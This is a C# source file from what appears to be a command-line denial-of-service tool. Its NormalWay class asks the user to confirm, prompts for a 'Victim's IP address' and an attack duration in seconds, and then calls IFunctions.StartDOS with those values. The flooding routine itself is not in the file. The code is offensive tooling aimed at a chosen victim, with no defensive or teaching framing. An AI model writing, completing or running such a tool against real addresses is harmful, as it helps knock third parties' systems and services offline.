using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace DOSCommandLine
{
    class NormalWay
    {

        public static void StartNormalWay()
        {
            //Starts All
            Console.Write("Continue?[Y/N]");
            tryAgain:;
            try
            {
                char charactere = Convert.ToChar(Console.ReadLine());

                //If the answer is equals to 'y' or 'Y', it's going to Start, else it's going to quit the program.
                if (charactere == 'y' || charactere == 'Y')
                {
                    Start();
                }
                else Application.Exit();
            }
            catch
            {
                goto tryAgain;
            }
        }

        static void Start()
        {
            //Get the victim's ip and the time to execute it.
            int time;

            Console.Write("Victim's IP address: ");
            string ip = Console.ReadLine();

            tryAgain:;
            Console.Write("Time to be executed(in seconds): ");
            try
            {
                time = Convert.ToInt32(Console.ReadLine());
            }
            catch
            {
                goto tryAgain;
            }

            IFunctions.StartDOS(ip, time * 1000);
        }
    }
}
